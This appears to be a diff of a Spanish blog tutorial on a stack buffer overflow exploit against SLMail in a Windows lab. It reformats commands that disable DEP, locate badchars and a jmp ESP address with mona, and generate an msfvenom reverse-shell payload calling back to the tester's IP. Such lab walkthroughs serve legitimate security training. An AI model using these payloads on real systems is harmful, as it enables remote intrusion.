@@ -33,7 +33,9 @@ Instalaremos SLMail y inmunity debuguer en la máquina windows, y luego añadire
 
 Además tendremos que crear reglas en el firewall de windows para permitan el tráfico en los puertos 25 y 110. Y por último deshabilitar el DEP con el siguiente comando ejecutado como administrador:
 
-`bcdedit.exe /set {current} nx AllwaysOff`
+```bash
+bcdedit.exe /set {current} nx AllwaysOff
+```
 
 Cuando tengamos esto ya podemos empezar a practicar.
 
@@ -215,7 +217,11 @@ En este punto, lo que pongamos detrás de nuestras 2606 "A" va a sobreescribir e
 
 Pero antes tenemos que calcular los badchars, que son carácteres que se deben evitar porque pueden hacer que nuestro shellcode no se interprete correctamente.
 
-En inmunity debuguer escribimos `!mona config -set workingfolder C:\Users\Ximo\Desktop\%p` y nos creará una carpeta en el escritorio con el nombre del proceso (en nuestro caso slmail).
+En inmunity debuguer escribimos
+```bash
+!mona config -set workingfolder C:\Users\Ximo\Desktop\%p
+```
+y nos creará una carpeta en el escritorio con el nombre del proceso (en nuestro caso slmail).
 
 Luego escribimos `!mona bytearray` que nos generará un array de bytes con todos los carácteres necesarios para calcular los badchars, y los pondrá en un fichero txt dentro de la carpeta que hemos generado en el paso anterior.
 
@@ -269,7 +275,11 @@ if __name__ == '__main__':
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/badchars.png)
 
-Vemos que ESP ahora vale 0151A128. Ahora ejecutamos en el inmunity `!mona compare -f C:\Users\Ximo\Desktop\SLmail\bytearray.bin -a 0151A128` y nos dice que el 00 es un badchar. Lo siguiente será eliminar del bytearray.txt y de nuestro script el 00 y volver a repetir el proceso hasta que `!mona compare` nos diga que ya no queda ningún badchar.
+Vemos que ESP ahora vale 0151A128. Ahora ejecutamos en el inmunity
+```bash
+!mona compare -f C:\Users\Ximo\Desktop\SLmail\bytearray.bin -a 0151A128
+```
+y nos dice que el 00 es un badchar. Lo siguiente será eliminar del bytearray.txt y de nuestro script el 00 y volver a repetir el proceso hasta que `!mona compare` nos diga que ya no queda ningún badchar.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/compare.png)
 
@@ -277,17 +287,27 @@ En este caso, después de repetir el proceso 3 veces, mona nos dice que los badc
 
 Vamos a generar un shellcode que no contenga estos badchars, y que nos lance una conexión a nuestra ip, con el siguiente comando:
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.15 LPORT=443 -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c`
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.15 LPORT=443 -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
+```
 
 Solo nos falta calcular el valor que tiene que tener EIP, que tiene que ser una dirección de memoria que contenga un salto al ESP (jmp ESP), que es donde estará nuestro shellcode.
 
-Para ello ejecutamos otra utilidad de metasploit `/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb` y estando dentro de la shell escribimos `jmp ESP`, lo que nos devuelve el opcode FFE4.
+Para ello ejecutamos otra utilidad de metasploit
+```bash
+/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
+```
+y estando dentro de la shell escribimos `jmp ESP`, lo que nos devuelve el opcode FFE4.
 
 Volvemos al inmunity y escribimos `!mona modules`. Esto nos sacará los módulos que utiliza el programa slmail, las dll que utiliza y las protecciones que tienen. Elegiremos una dll que tenga todas las protecciones en FALSE. En nuestro caso SLMFC.DLL.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/modules.png)
 
-Ejecutamos `!mona find -s "\xff\xe4" -m SLMFC.DLL`. Esto nos buscará las direcciones de memoria que contienen un jmp ESP (FFE4) en el módulo SLMFC.DLL. Elegiremos una dirección que no contenga ninguno de los badchars encontrados anteriormente. En nuestro caso 5F4A358F.
+Ejecutamos
+```bash
+!mona find -s "\xff\xe4" -m SLMFC.DLL
+```
+Esto nos buscará las direcciones de memoria que contienen un jmp ESP (FFE4) en el módulo SLMFC.DLL. Elegiremos una dirección que no contenga ninguno de los badchars encontrados anteriormente. En nuestro caso 5F4A358F.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/jmpesp.png)
 
